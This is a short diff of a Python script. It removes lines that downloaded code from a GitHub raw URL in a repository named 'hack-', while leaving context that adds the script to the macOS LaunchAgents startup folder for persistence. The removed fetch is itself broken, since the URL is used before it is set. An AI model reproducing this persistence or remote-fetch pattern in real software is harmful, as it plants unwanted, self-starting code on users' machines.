@@ -1,4 +1,4 @@
-import urllib.request
+
 import os
 import shutil
 import sys
@@ -28,8 +28,7 @@ def main():
         startup_folder = os.path.join(os.getenv('HOME'), 'Library', 'LaunchAgents')
         if not os.path.isfile(os.path.join(startup_folder, os.path.basename(file_path))):
             add_to_startup(file_path)
-        skript_code = urllib.request.urlopen(url).read()
-        url = 'https://raw.githubusercontent.com/huggywuggyMaster/hack-/main/run.py'
+        
 
 if __name__ == "__main__":
     main()
